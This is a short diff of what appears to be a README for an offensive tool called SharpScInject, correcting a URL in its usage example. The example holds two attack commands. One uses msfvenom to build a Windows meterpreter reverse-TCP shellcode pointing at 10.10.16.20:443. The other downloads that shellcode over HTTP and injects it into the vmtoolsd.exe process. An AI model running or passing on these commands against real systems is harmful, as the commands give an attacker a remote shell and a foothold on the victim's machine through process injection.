@@ -33,5 +33,5 @@ $method.Invoke($null, $argu.ToArray())
 ## example
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.20  LPORT=443 -f raw -o a.raw
-.\SharpScInject.exe vmtoolsd.exe http:/10.10.16.20/a.raw
+.\SharpScInject.exe vmtoolsd.exe http://10.10.16.20/a.raw
 ```
